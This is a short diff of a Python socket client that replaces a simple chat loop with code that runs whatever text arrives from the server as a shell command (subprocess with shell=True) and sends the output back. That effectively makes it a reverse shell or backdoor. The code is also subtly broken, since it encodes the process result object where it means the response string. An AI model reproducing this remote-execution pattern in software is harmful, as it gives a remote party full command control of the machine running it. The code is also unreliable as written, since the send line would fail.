@@ -1,4 +1,5 @@
 # ---------- Sockets network : Client ----------
+import subprocess
 import socket
 import time
 
@@ -26,12 +27,17 @@ while True:
 #     print("No data")
 
 while True:
-    received_data = s.recv(MAX_DATA_SIZE)
-    if not received_data:
+    command_data = s.recv(MAX_DATA_SIZE)
+    if not command_data:
         break
-    print(f"Message received: {received_data.decode()}")
-    text_to_send = input("Your message: ")
-    s.sendall(text_to_send.encode())
+    command = command_data.decode()
+    print(f"Command : {str(command)}")
+    result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
+    response = result.stdout + result.stderr
+
+    if not response or len(response) == 0:
+        response = ""
+    s.sendall(result.encode())
 
 
 s.close()
